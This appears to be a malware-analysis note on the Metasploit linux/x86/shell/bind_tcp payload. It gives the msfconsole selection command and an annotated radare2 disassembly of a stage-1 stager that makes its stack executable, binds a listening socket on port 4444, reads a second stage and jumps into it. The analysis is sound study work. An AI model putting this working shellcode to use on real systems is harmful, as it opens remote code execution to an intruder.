# Metasploit linux/x86/shell/bind_tcp

## Generate
```
msf5 > use(payload/linux/x86/shell/bind_tcp)
msf5 payload(linux/x86/shell/bind_tcp) >
```

## Disassembled Content
```
$ r2 -a x86 -b 32 -c 'pd' stage1.bin
            0x00000000      6a7d           push 0x7d                   ; '}' ; 125
            0x00000002      58             pop eax
            0x00000003      99             cdq
            0x00000004      b207           mov dl, 7
            0x00000006      b900100000     mov ecx, 0x1000
            0x0000000b      89e3           mov ebx, esp
            0x0000000d      6681e300f0     and bx, 0xf000             ; mprotect(void *addr, size_t len, int prot);
            0x00000012      cd80           int 0x80                   ; mprotect(*esp, 4096, PROT_READ|PROT_WRITE|PROT_EXC…)
            0x00000014      31db           xor ebx, ebx
            0x00000016      f7e3           mul ebx
            0x00000018      53             push ebx                   ; protocol = 0
            0x00000019      43             inc ebx                    ; SOCK_STREAM
            0x0000001a      53             push ebx
            0x0000001b      6a02           push 2                     ; 2 AF_INET
            0x0000001d      89e1           mov ecx, esp
            0x0000001f      b066           mov al, 0x66               ; socketcall(int call, unsigned long *args);
            0x00000021      cd80           int 0x80                   ; socketcall(SYS_SOCKET, *esp)
            0x00000023      51             push ecx
            0x00000024      6a04           push 4                      ; 4
            0x00000026      54             push esp
            0x00000027      6a02           push 2                      ; 2
            0x00000029      6a01           push 1                      ; 1
            0x0000002b      50             push eax
            0x0000002c      97             xchg eax, edi
            0x0000002d      89e1           mov ecx, esp
            0x0000002f      6a0e           push 0xe                    ; 14
            0x00000031      5b             pop ebx
            0x00000032      6a66           push 0x66                   ; 'f' ; 102
            0x00000034      58             pop eax
            0x00000035      cd80           int 0x80
            0x00000037      97             xchg eax, edi
            0x00000038      83c414         add esp, 0x14
            0x0000003b      59             pop ecx
            0x0000003c      5b             pop ebx
            0x0000003d      5e             pop esi
            0x0000003e      52             push edx
            0x0000003f      680200115c     push 0x5c110002
            0x00000044      6a10           push 0x10                   ; 16
            0x00000046      51             push ecx
            0x00000047      50             push eax
            0x00000048      89e1           mov ecx, esp
            0x0000004a      6a66           push 0x66                   ; 'f' ; 102
            0x0000004c      58             pop eax
            0x0000004d      cd80           int 0x80
            0x0000004f      d1e3           shl ebx, 1
            0x00000051      b066           mov al, 0x66                ; 'f' ; 102
            0x00000053      cd80           int 0x80
            0x00000055      50             push eax
            0x00000056      43             inc ebx
            0x00000057      b066           mov al, 0x66                ; 'f' ; 102
            0x00000059      895104         mov dword [ecx + 4], edx
            0x0000005c      cd80           int 0x80
            0x0000005e      93             xchg eax, ebx
            0x0000005f      b60c           mov dh, 0xc                 ; 12
            0x00000061      b003           mov al, 3
            0x00000063      cd80           int 0x80
            0x00000065      87df           xchg edi, ebx
            0x00000067      5b             pop ebx
            0x00000068      b006           mov al, 6
            0x0000006a      cd80           int 0x80
            0x0000006c      ffe1           jmp ecx
            0x0000006e      ff             invalid
            0x0000006f      ff             invalid
            0x00000070      ff             invalid
```
